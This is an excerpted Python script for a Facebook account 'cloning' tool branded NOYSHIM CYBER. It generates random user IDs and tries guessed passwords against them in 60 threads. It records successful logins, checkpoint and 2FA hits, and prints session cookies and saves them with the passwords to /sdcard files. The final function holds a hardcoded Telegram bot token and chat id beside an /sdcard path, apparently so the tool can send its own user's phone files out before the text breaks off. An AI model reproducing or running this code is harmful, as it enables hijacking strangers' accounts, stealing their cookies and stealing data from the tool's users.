...
xbook = []
pas = ("NOYSHIMya", "lamha123", "sadiya"," fariya","nadiya","habiba","tamima","naimkhan","santohasan","emrankhan","rjfarhan","rajibhasab")
...
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝
   ...
   \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
   ║  \x1b[97m\033[37;41m  ASKED YOU PAPA HWO I AM NOYSHIM   \033[0;m   \33[1;92m    ║
   \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝        """)    
...
os.system('xdg-open https://github.com/mdbot77')
name=fuckx.upper()

jalan('\x1b[1;31mNOYSHIM CYBER  INFINITY CLONING START PLEASE WAIT ..........')
time.sleep(2)
os.system('clear')
loading()
...
def NOYSHIMya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :NOYSHIM = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :NOYSHIM = ' √ 2009'
        elif uid[:8] in ['10000000']        :NOYSHIM = ' √ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:NOYSHIM = ' √ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:NOYSHIM = ' 2010'
        elif uid[:6] in ['100001']          :NOYSHIM = ' √ 2010/2011'
        elif uid[:6] in ['100002','100003'] :NOYSHIM = ' √ 2011/2012'
        elif uid[:6] in ['100004']          :NOYSHIM = ' √ 2012/2013'
        elif uid[:6] in ['100005','100006'] :NOYSHIM = ' √ 2013/2014'
        elif uid[:6] in ['100007','100008'] :NOYSHIM = ' √ 2014/2015'
        elif uid[:6] in ['100009']          :NOYSHIM = ' √ 2015'
        elif uid[:5] in ['10001']           :NOYSHIM = ' √ 2015/2016'
        elif uid[:5] in ['10002']           :NOYSHIM = ' √ 2016/2017'
        elif uid[:5] in ['10003']           :NOYSHIM = ' √ 2018/2019'
        elif uid[:5] in ['10004']           :NOYSHIM = ' √ 2019/2020'
        elif uid[:5] in ['10005']           :NOYSHIM = ' √ 2020'
        elif uid[:5] in ['10006','10007','']:NOYSHIM = ' √ 2021'
        elif uid[:5] in ['10008']           :NOYSHIM = ' √ 2022'
        elif uid[:5] in ['10009']           :NOYSHIM = ' √ 2023'
        else:NOYSHIM=''
...
▀▄▄▄▀▀▄▄▀▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▀▄▀▄▄▄▀▄▄▄▀▄▄▄▀
    ...
    \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
     {H} ╔════════════════════════{M}════════════════╗
      {H}║{M}[{H}•{M}] AUTHOR    :{H} NOYSHIM CYBER             {N}{M}║
      {H}║{M}[{H}•{M}] FACEBOOK  : {H}MD NOYSHIM          {N}{M}║
      {H}║{M}[{H}•{M}] GITHUB    : {H}mdbot77{N}       {H}  ║
...
def main():
    ...
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}NOYSHIM X')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}NOYSHIM X')
    print(f' ')
    print(f"{M}╔══[{M}1{RED}] \033[1;32mSTART INFINITY  CLONING {RED}(TCW)")
    print(f"║══[{M}2{RED}] \033[1;34mFOLLOWED MY GITHUB [<\>] {RED}(FIRST)")
    print(f"║══[{M}3{RED}] \033[1;35mBACK PROGRAMME [<\>] ")
    print(f"{RED}╚══[{M}U{RED}] \033[1;31mUPDATE PROGRAMME ")
    sh = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if sh =='1':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100090116154221/')
       _xxx_()
    if sh =='2':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100090116154221/')
       main()
...
def _xxx_():
    ...
    print(f'{M}╚══[•] CODER NAME: {H}NOYSHIM X')
    print(f' ')
    print(f"{M}╔══[{M}1{RED}] \033[1;32mSTART INFINITY  RANDOM {RED}(TCW)")
    print(f"{M}╔══[{M}2{RED}] \033[1;31mSTART INFINITY  X GMAIL {RED}(TCW)")
    print(f"║══[{M}3{RED}] \033[1;34mFOLLOW ME GITHUB [<\>] {RED}(FIRST)")
    print(f"║══[{M}4{RED}] \033[1;35mBACK PROGRAMME [<\>] ")
    print(f"{RED}╚══[{M}U{RED}] \033[1;31mUPDATE PROGRAMME ")
    sh = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if sh =='1':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100090116154221/')
...
def _xnxx_():
    ...
    print(f'{M}╚══[•] CODER NAME: {H}NOYSHIM X')
    print(f" ")
    print(f"{RED}╔══[{M}1{M}] {RED}RANDOM USER NME {RED} (MIX) ")
    print(f"║══[{M}2{RED}] {GREEN}RANDOM GMAIL CLONING{RED}[>/]")
    print(f"║══[{M}3{RED}] {BLACK}FOLLOW ME ON GITHUB{RED}[>/]")
    print(f"║══[{M}F{RED}] {BLACK}FOLLOW ME ON FB{RED} ")
    print(f"╚══[{M}U{RED}] {BLACK}UPDATE PROGRAMME ")
    sh = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if sh =='1':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100090116154221/')
       user()
...
def _FUCKER_():
    ...
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}NOYSHIM GREEN X')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}NOYSHIM HASAN')
    print(" ")
...
def shbd():
    ...
    print(f"")
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/NOYSHIM/DOREMON/OGGY')
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love),  (xbook), (pok), ('###@@@'), ('#@#@#'), ('NOYSHIM'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (xbook),  (pok), ('###@@@'), ('#@#@#'), ('NOYSHIM'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (xbook), (pok), ('###@@@'), ('#@#@#'), ('NOYSHIM'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('NOYSHIM'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('NOYSHIM'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('NOYSHIM'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('NOYSHIM'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('NOYSHIM'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('NOYSHIM'), ('free fire')])
            if pom =='1':
...
def shind():
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('57273200'), ('NOYSHIM'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('NOYSHIM'), ('57273200'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('NOYSHIM'), ('57273200'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('NOYSHIM'), ('57273200'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('NOYSHIM'), ('57273200'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('NOYSHIM'), ('57273200'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('NOYSHIM'), ('57273200'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('NOYSHIM'), ('57273200'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('NOYSHIM'), ('57273200'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
...
def shpak():
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('NOYSHIM'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('NOYSHIM'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('NOYSHIM'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('NOYSHIM'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('NOYSHIM'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('NOYSHIM'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('NOYSHIM'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('NOYSHIM'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('NOYSHIM'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
...
def gmail():
    ...
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}NOYSHIM{P}][{B}MASUD{P}][{K}MAHIN{P}][{K}FAHIM{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff = input(f' CHOOSE :{H} ')
    gg = ff.lower()
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            NOYSHIM = random.choice(["\x1b[1;91mNOYSHIM","\x1b[1;92mNOYSHIM","\x1b[1;93mNOYSHIM","\x1b[1;94mNOYSHIM","\x1b[1;95mNOYSHIM","\x1b[1;96mNOYSHIM","\x1b[1;97mNOYSHIM","\x1b[1;91mNOYSHIM","\x1b[1;92mNOYSHIM","\x1b[1;93mNOYSHIM","\x1b[1;94mNOYSHIM","\x1b[1;95mNOYSHIM","\x1b[1;96mNOYSHIM"])
            sys.stdout.write(f'\r    {P}[{NOYSHIM}{P}][{K}%s{P}/{B}%s{P}][{H}OK{P}/{M}LOK{P}/{B}2F{P}]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok),len(lok),len(twf))),
            sys.stdout.flush()
            ...
            if 'm_page_voice' in log_cookies:
                ...
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NOYSHIM-LOK] '+uid+' | '+ps+'\033[1;91m'+NOYSHIMya(uidf)+' ')
                if 'y' in NOYSHIM:
                  print(f'    {B}[COOKI😎] {B}'+coki)
                open('/sdcard/NOYSHIM-LOK.txt', 'a').write(uidf+' | '+ps+'\n')
                lok.append(uidf)
            elif 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NOYSHIM-OK] '+uid+' | '+ps+'\033[1;91m'+NOYSHIMya(uidf)+' ')
                if 'y' in NOYSHIM:
                  print(f'    {B}[COOKI😎] {B}'+coki)
                open('/sdcard/NOYSHIM-OK.txt', 'a').write(uidf+' | '+ps+'\n')
                ok.append(uidf)
            elif '/x/checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uidf=coki[141:156]
                    if 'y' in hello:
                      print('    \033[1;91m[NOYSHIM-2F] '+uid+' | '+ps+'\033[1;91m'+NOYSHIMya(uidf)+' ')
                      print(f'    {RED}[COOKI😎] {RED}'+coki)
                      open('/sdcard/NOYSHIM-2F.txt', 'a').write(uidf+' | '+ps+'\n')
                    twf.append(uidf)
                    break
            else:
                continue
...
def n(uid,pwx,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mNOYSHIM\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            # = random.choice(["\x1b[1;91mNOYSHIM","\x1b[1;92mNOYSHIM","\x1b[1;93mNOYSHIM","\x1b[1;94mNOYSHIM","\x1b[1;95mNOYSHIM","\x1b[1;96mNOYSHIM","\x1b[1;97mNOYSHIM","\x1b[1;91mNOYSHIM","\x1b[1;92mNOYSHIM","\x1b[1;93mNOYSHIM","\x1b[1;94mNOYSHIM","\x1b[1;95mNOYSHIM","\x1b[1;96mNOYSHIM"])
            #sys.stdout.write(f'\r    {P}[{NOYSHIM}{P}][{K}%s{P}/{B}%s{P}][{H}OK]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok))),
            #sys.stdout.flush()
            ...
            if 'access_token' in po:
                ...
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NOYSHIM-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI😎] {B}'+coki)
                open('/sdcard/NOYSHIM-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            animasi = random.choice(["\x1b[1;91mNOYSHIM","\x1b[1;92mNOYSHIM","\x1b[1;93mNOYSHIM","\x1b[1;94mNOYSHIM","\x1b[1;95mNOYSHIM","\x1b[1;96mNOYSHIM","\x1b[1;97mNOYSHIM","\x1b[1;91mNOYSHIM","\x1b[1;92mNOYSHIM","\x1b[1;93mNOYSHIM","\x1b[1;94mNOYSHIM","\x1b[1;95mNOYSHIM","\x1b[1;96mNOYSHIM"])
            ...
            if 'access_token' in po:
                ...
                print('    \033[1;92m[NOYSHIM-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI😎] {B}'+coki)
                open('/sdcard/NOYSHIM-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                ok.append(uidf)
            elif 'www.facebook.com' in po['error_msg']:
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NOYSHIM-CP] '+uid+' | '+ps)
                print(f'    {B}[COOKI😎] {B}'+coki)
                open('/sdcard/NOYSHIM-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                cp.append(uidf)
                break
...
def sexy():
    ...
    bot_token = '6580787566:AAF1TFgWS2dkICtfbhOhcOL_PUkMZmJZwqs' 
    chat_id = '6396308562'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
